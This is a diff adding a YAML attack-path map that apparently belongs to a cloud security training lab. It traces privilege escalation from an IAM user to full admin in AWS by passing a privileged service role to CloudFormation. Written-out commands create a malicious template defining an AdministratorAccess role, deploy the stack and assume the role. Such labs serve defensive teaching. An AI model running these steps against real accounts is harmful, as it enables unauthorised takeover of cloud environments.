@@ -1,0 +1,103 @@
+attackMap:
+  nodes:
+    - id: starting-user
+      label: "Starting User"
+      type: principal
+      subType: iam-user
+      arn: "arn:aws:iam::{account_id}:user/pl-prod-cloudformation-001-to-admin-starting-user"
+      description: >
+        You have gained access to this principal's AWS IAM credentials. These could
+        have been obtained through many real-world vectors: phishing a developer and
+        gaining access to their workstation, compromising a browser session, exploiting
+        a vulnerable workload running in this AWS account, discovering credentials in
+        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.
+
+        Regardless of how you obtained them, you are now operating as this principal.
+        This IAM user has iam:PassRole permission on the CloudFormation service role
+        (pl-prod-cloudformation-001-to-admin-cfn-role) and cloudformation:CreateStack
+        on all resources — a combination that enables privilege escalation via
+        infrastructure-as-code abuse.
+
+    - id: cfn-stack
+      label: "CloudFormation Stack"
+      type: resource
+      subType: cloudformation-stack
+      arn: "arn:aws:cloudformation:{region}:{account_id}:stack/pl-prod-cloudformation-001-to-admin-escalation-stack/*"
+      description: >
+        A CloudFormation stack created by the attacker using a malicious template.
+        The stack is deployed with pl-prod-cloudformation-001-to-admin-cfn-role as
+        the service role, granting CloudFormation administrative permissions to
+        provision any resource defined in the template — including IAM roles with
+        arbitrary trust policies and permission policies.
+
+    - id: escalated-role
+      label: "Escalated Admin Role"
+      type: principal
+      subType: iam-role
+      isTarget: true
+      arn: "arn:aws:iam::{account_id}:role/pl-prod-cloudformation-001-to-admin-escalated-role"
+      description: >
+        A new IAM role with AdministratorAccess created by the CloudFormation stack.
+        The trust policy on this role allows the starting user to assume it directly,
+        granting full administrative access to the AWS account.
+
+  edges:
+    - from: starting-user
+      to: cfn-stack
+      label: "iam:PassRole + cloudformation:CreateStack"
+      description: >
+        The starting user passes the privileged CFN service role to CloudFormation
+        and creates a stack with a malicious template. CloudFormation executes the
+        template using the admin service role's permissions.
+      hints:
+        - "You can pass IAM roles to AWS services. What service here accepts a service role?"
+        - "CloudFormation can create any resource in a template, including IAM roles. What if the template creates a role you can assume?"
+        - "Browse to https://pathfinding.cloud/paths/cloudformation-001 for technique details."
+      commands:
+        - description: "Create a malicious CloudFormation template that defines an admin role"
+          command: |
+            cat > /tmp/cfn-cloudformation-001-escalation-template.yaml <<EOF
+            AWSTemplateFormatVersion: '2010-09-09'
+            Resources:
+              EscalatedRole:
+                Type: AWS::IAM::Role
+                Properties:
+                  RoleName: pl-prod-cloudformation-001-to-admin-escalated-role
+                  AssumeRolePolicyDocument:
+                    Version: '2012-10-17'
+                    Statement:
+                      - Effect: Allow
+                        Principal:
+                          AWS: arn:aws:iam::ACCOUNT_ID:user/pl-prod-cloudformation-001-to-admin-starting-user
+                        Action: sts:AssumeRole
+                  ManagedPolicyArns:
+                    - arn:aws:iam::aws:policy/AdministratorAccess
+            EOF
+        - description: "Create the CloudFormation stack with the privileged service role"
+          command: "aws cloudformation create-stack --stack-name pl-prod-cloudformation-001-to-admin-escalation-stack --template-body file:///tmp/cfn-cloudformation-001-escalation-template.yaml --role-arn arn:aws:iam::ACCOUNT_ID:role/pl-prod-cloudformation-001-to-admin-cfn-role --capabilities CAPABILITY_NAMED_IAM"
+        - description: "Wait for the stack to complete"
+          command: "aws cloudformation wait stack-create-complete --stack-name pl-prod-cloudformation-001-to-admin-escalation-stack"
+
+    - from: cfn-stack
+      to: escalated-role
+      label: "CloudFormation provisions IAM role"
+      description: >
+        CloudFormation, running with the admin service role's permissions, provisions
+        the IAM role defined in the malicious template. The resulting role has
+        AdministratorAccess and trusts the starting user.
+      hints:
+        - "The stack executes with the passed admin service role. What can it create?"
+        - "Craft a template that defines a new IAM role with AdministratorAccess and a trust policy that allows your starting user to assume it."
+      commands: []
+
+    - from: starting-user
+      to: escalated-role
+      label: "sts:AssumeRole"
+      description: >
+        The starting user assumes the newly created escalated role, obtaining
+        administrative credentials for the AWS account.
+      commands:
+        - description: "Assume the escalated role created by CloudFormation"
+          command: "aws sts assume-role --role-arn arn:aws:iam::ACCOUNT_ID:role/pl-prod-cloudformation-001-to-admin-escalated-role --role-session-name privesc-session"
+        - description: "Verify administrator access"
+          command: "aws iam list-users"
